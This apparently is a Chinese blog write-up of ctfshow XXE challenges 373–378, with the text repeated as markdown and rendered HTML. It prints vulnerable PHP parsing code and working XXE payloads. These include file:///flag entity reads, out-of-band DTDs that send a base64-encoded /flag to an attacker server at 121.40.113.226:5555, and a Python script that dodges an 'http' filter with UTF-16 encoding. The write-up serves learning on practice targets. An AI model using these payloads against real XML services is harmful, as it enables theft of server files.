\">\n%dtd;\n%xxe;\n```\n\n有两个问题,\n\n第一个就是为什么要将%进行编码为`&#x25;`,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成`&#x25;`,未成功\n\n第二个是为什么要实体里面包含实体,不能直接执行\n\n`<!ENTITY % xxe  SYSTEM \"http://121.40.113.226:5555/%file;\"> \n%xxe;`\n\n但是如果写成这样,请求的路径就还是dtd文档了![image-20220110183234994](https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png)\n\n在尝试中一个偶然的错误让我有了启发,----我忘记给dtd中的url加端口了\n\n![image-20220110183404676](https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png)\n\n![image-20220110183422805](https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png)\n\n此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写\n\n![image-20220110183448490](https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png)\n\n在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档\n\n突然看到用payload的时候请求信息是两条,\n\n![image-20220110185118318](https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png)\n\n然后将dtd文档改成\n\n`<!ENTITY % xxe  SYSTEM 'http://121.40.113.226:5555/1;'>\n%xxe;`\n\n请求路径还是两条\n\n![image-20220110185242294](https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png)\n\n这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style=\"color:red\">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe\n\n### ctfshow web 375\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/<\\?xml version=\"1\\.0\"/', $xmlfile)){\n    die('error');\n}\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);    \n```\n\n相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响\n\n##### payload\n\nxml\n\n```xml\n<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\n\n```\n\ndtd\n\n```dtd\n<!ENTITY % dtd \"<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> \">\n%dtd;\n%xxe;\n```\n\n### ctfshow web 376\n\n这题只是将正则转变成了不区分大小写,payload还是同上375题的\n\n### ctfshow web 377\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/<\\?xml version=\"1\\.0\"|http/i', $xmlfile)){\n    die('error');\n}\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);  \n```\n\n本题对http关键字做了过滤,但是xml可以用utf16编码\n\n##### payload\n\n```python\nimport requests\npayload=\"\"\"<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\"\"\"\nurl=\"http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show\"\nrequests.post(url=url,data=payload.encode(\"utf-16\"))\n```\n\n有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢\n\n这个是用burp抓的python发的包\n\n![image-20220110205856482](https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png)\n\n### ctfshow web 378\n\n##### payload\n\n```xml\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n<user>\n<username>&xxe;</username>\n</user>\n```\n\n这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了.....\n\n![image-20220110205445709](https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png)\n\n","source":"_posts/xxe题目.md","raw":"---\ntitle: xxe题目\ndate: 2021-12-25 13:06:11\ntags:\n      - xxe\n      - ctf\ncategories: xxe\ntypora-root-url: ..\ndescription: 一些xxe题目实践\n---\n\n## ctfshow\n\n### ctfshow web 373\n\nphp://input\n\n从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。\n\n数据包中反倒是不管是get还是post,php://input都会<label style=\"color:red\">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)\n\n```php\n<?php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);//设置为false则允许外部实体加载\n$xmlfile = file_get_contents('php://input');//将获取到的数据包内容转换成字符串\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &a; 这样的写法\n    $creds = simplexml_import_dom($dom);//把 DOM 节点转换为 SimpleXMLElement 对象。\n    $ctfshow = $creds->ctfshow;//找到里面的ctfshow标签\n    echo $ctfshow;//输出ctfshow标签的内容\n}\nhighlight_file(__FILE__);    \n\n\n\n```\n\n综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行\n\n##### payload\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n//上面为内部dtd文档\n<neo>\n<ctfshow>&xxe;</ctfshow>\n</neo>\n```\n\n### ctfshow web 374\n\n本题没有回显,需要使用外带dtd\n\n利用python在云服务器搭建一个http服务器,并保持监听\n\n`python3 -m http.server 5555`\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);    \n\n```\n\n本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出\n\n\n\n起初这样写了dtd文档\n\n```dtd\n<!ENTITY % b SYSTEM \"http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag\">\n%b;\n```\n\nxml\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE a[\n\t<!ENTITY % xxe SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n\t%xxe;\n\n]>\n```\n\n服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容\n\n![image-20220110180025568](https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png)\n\n 更改后的dtd文档\n\n```dtd\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % b SYSTEM \"http://121.40.113.226:5555/%file;\">\n%b;\n```\n\n这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了......\n\n![image-20220110180342295](https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png)\n\n查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404\n\n![image-20220110182024289](https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png)\n\n##### payload\n\nxml\n\nxml通过前面的尝试已经完全理解了\n\n```xml\n<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\n\n```\n\ndtd\n\n```dtd\n<!ENTITY % dtd \"<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> \">\n%dtd;\n%xxe;\n```\n\n有两个问题,\n\n第一个就是为什么要将%进行编码为`&#x25;`,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成`&#x25;`,未成功\n\n第二个是为什么要实体里面包含实体,不能直接执行\n\n`<!ENTITY % xxe  SYSTEM \"http://121.40.113.226:5555/%file;\"> \n%xxe;`\n\n但是如果写成这样,请求的路径就还是dtd文档了![image-20220110183234994](https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png)\n\n在尝试中一个偶然的错误让我有了启发,----我忘记给dtd中的url加端口了\n\n![image-20220110183404676](https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png)\n\n![image-20220110183422805](https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png)\n\n此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写\n\n![image-20220110183448490](https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png)\n\n在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档\n\n突然看到用payload的时候请求信息是两条,\n\n![image-20220110185118318](https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png)\n\n然后将dtd文档改成\n\n`<!ENTITY % xxe  SYSTEM 'http://121.40.113.226:5555/1;'>\n%xxe;`\n\n请求路径还是两条\n\n![image-20220110185242294](https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png)\n\n这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style=\"color:red\">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe\n\n### ctfshow web 375\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/<\\?xml version=\"1\\.0\"/', $xmlfile)){\n    die('error');\n}\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);    \n```\n\n相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响\n\n##### payload\n\nxml\n\n```xml\n<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\n\n```\n\ndtd\n\n```dtd\n<!ENTITY % dtd \"<!ENTITY &#x25; xxe  SYSTEM 'http://121.40.113.226:5555/%file;'> \">\n%dtd;\n%xxe;\n```\n\n### ctfshow web 376\n\n这题只是将正则转变成了不区分大小写,payload还是同上375题的\n\n### ctfshow web 377\n\n题目代码\n\n```php\nerror_reporting(0);\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\nif(preg_match('/<\\?xml version=\"1\\.0\"|http/i', $xmlfile)){\n    die('error');\n}\nif(isset($xmlfile)){\n    $dom = new DOMDocument();\n    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n}\nhighlight_file(__FILE__);  \n```\n\n本题对http关键字做了过滤,但是xml可以用utf16编码\n\n##### payload\n\n```python\nimport requests\npayload=\"\"\"<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % aaa SYSTEM \"http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd\">\n%aaa;\n]>\n<test>123</test>\"\"\"\nurl=\"http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show\"\nrequests.post(url=url,data=payload.encode(\"utf-16\"))\n```\n\n有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢\n\n这个是用burp抓的python发的包\n\n![image-20220110205856482](https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png)\n\n### ctfshow web 378\n\n##### payload\n\n```xml\n<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n<user>\n<username>&xxe;</username>\n</user>\n```\n\n这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了.....\n\n![image-20220110205445709](https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png)\n\n","slug":"xxe题目","published":1,"updated":"2022-01-11T05:04:01.526Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9nb0025gsw981ux20ld","content":"<h2 id=\"ctfshow\"><a href=\"#ctfshow\" class=\"headerlink\" title=\"ctfshow\"></a>ctfshow</h2><h3 id=\"ctfshow-web-373\"><a href=\"#ctfshow-web-373\" class=\"headerlink\" title=\"ctfshow web 373\"></a>ctfshow web 373</h3><p>php://input</p>\n<p>从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。</p>\n<p>数据包中反倒是不管是get还是post,php://input都会<label style=\"color:red\">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);<span class=\"comment\">//设置为false则允许外部实体加载</span></span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);<span class=\"comment\">//将获取到的数据包内容转换成字符串</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class=\"comment\">//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &amp;a; 这样的写法</span></span><br><span class=\"line\">    <span class=\"variable\">$creds</span> = simplexml_import_dom(<span class=\"variable\">$dom</span>);<span class=\"comment\">//把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class=\"line\">    <span class=\"variable\">$ctfshow</span> = <span class=\"variable\">$creds</span>-&gt;ctfshow;<span class=\"comment\">//找到里面的ctfshow标签</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$ctfshow</span>;<span class=\"comment\">//输出ctfshow标签的内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行</p>\n<h5 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\">//上面为内部dtd文档</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ctfshow</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">ctfshow</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ctfshow-web-374\"><a href=\"#ctfshow-web-374\" class=\"headerlink\" title=\"ctfshow web 374\"></a>ctfshow web 374</h3><p>本题没有回显,需要使用外带dtd</p>\n<p>利用python在云服务器搭建一个http服务器,并保持监听</p>\n<p><code>python3 -m http.server 5555</code></p>\n<p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出</p>\n<p>起初这样写了dtd文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class=\"line\">%b;</span><br></pre></td></tr></table></figure>\n\n<p>xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE a[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%xxe;</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png\" alt=\"image-20220110180025568\"></p>\n<p> 更改后的dtd文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;</span><br><span class=\"line\">%b;</span><br></pre></td></tr></table></figure>\n\n<p>这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了……</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png\" alt=\"image-20220110180342295\"></p>\n<p>查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png\" alt=\"image-20220110182024289\"></p>\n<h5 id=\"payload-1\"><a href=\"#payload-1\" class=\"headerlink\" title=\"payload\"></a>payload</h5><p>xml</p>\n<p>xml通过前面的尝试已经完全理解了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">aaa</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%aaa;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class=\"line\">%dtd;</span><br><span class=\"line\">%xxe;</span><br></pre></td></tr></table></figure>\n\n<p>有两个问题,</p>\n<p>第一个就是为什么要将%进行编码为<code>&amp;#x25;</code>,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成<code>&amp;#x25;</code>,未成功</p>\n<p>第二个是为什么要实体里面包含实体,不能直接执行</p>\n<p><code>&lt;!ENTITY % xxe  SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;  %xxe;</code></p>\n<p>但是如果写成这样,请求的路径就还是dtd文档了<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png\" alt=\"image-20220110183234994\"></p>\n<p>在尝试中一个偶然的错误让我有了启发,—-我忘记给dtd中的url加端口了</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png\" alt=\"image-20220110183404676\"></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png\" alt=\"image-20220110183422805\"></p>\n<p>此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png\" alt=\"image-20220110183448490\"></p>\n<p>在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档</p>\n<p>突然看到用payload的时候请求信息是两条,</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png\" alt=\"image-20220110185118318\"></p>\n<p>然后将dtd文档改成</p>\n<p><code>&lt;!ENTITY % xxe  SYSTEM &#39;http://121.40.113.226:5555/1;&#39;&gt; %xxe;</code></p>\n<p>请求路径还是两条</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png\" alt=\"image-20220110185242294\"></p>\n<p>这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style=\"color:red\">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe</p>\n<h3 id=\"ctfshow-web-375\"><a href=\"#ctfshow-web-375\" class=\"headerlink\" title=\"ctfshow web 375\"></a>ctfshow web 375</h3><p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/&#x27;</span>, <span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br></pre></td></tr></table></figure>\n\n<p>相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响</p>\n<h5 id=\"payload-2\"><a href=\"#payload-2\" class=\"headerlink\" title=\"payload\"></a>payload</h5><p>xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">aaa</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%aaa;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class=\"line\">%dtd;</span><br><span class=\"line\">%xxe;</span><br></pre></td></tr></table></figure>\n\n<h3 